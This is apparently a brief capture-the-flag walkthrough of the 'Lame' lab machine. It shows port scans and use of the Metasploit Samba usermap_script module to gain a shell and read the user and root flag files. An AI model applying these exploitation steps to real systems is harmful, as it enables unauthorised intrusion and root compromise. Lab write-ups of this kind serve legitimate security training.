
# ****10.10.10.3 - Lame****

```bash
rustscan -a 10.10.10.3
```

![Untitled](https://github.com/lufffe/Writeups/assets/90646635/6efb5f15-da57-45bb-95c6-ec7ee47a2fa2)

```bash
nmap -A -p 21,22,139,445,332 10.10.10.3 -Pn
```

![Untitled](https://github.com/lufffe/Writeups/assets/90646635/6fcd0ee4-f89b-4ad0-a6f4-7aa9b87c7447)


### FTP - Nada Encontrado


![image](https://github.com/lufffe/Writeups/assets/90646635/02edc325-fa94-4adc-9310-acbc60314a50)

```bash
msfconsole
```

![image](https://github.com/lufffe/Writeups/assets/90646635/59827a74-da5a-42f9-af26-bf5dcdf666f3)

<aside>
💡 https://www.exploit-db.com/exploits/16320
</aside>

![image](https://github.com/lufffe/Writeups/assets/90646635/d61b302a-9f86-4b48-8ffc-946c8b6ff51c)

```bash
search username map script
```

![image](https://github.com/lufffe/Writeups/assets/90646635/30b28df0-9074-42e4-bd3e-b8470a448e65)

###  Metasploit

```bash
msf6 > use 1
```

```bash
msf6 exploit(multi/samba/usermap_script) > show options
```

```bash
msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
```

```bash
msf6 exploit(multi/samba/usermap_script) > set lhost 
```

```bash
msf6 exploit(multi/samba/usermap_script) > exploit
```

![image](https://github.com/lufffe/Writeups/assets/90646635/eaad40bd-1792-4292-90d4-d495e3843c7d)

pwd
/home/makis

```bash
cat user.txt
```

pwd /root/
```bash
cat /root/root.txt
```
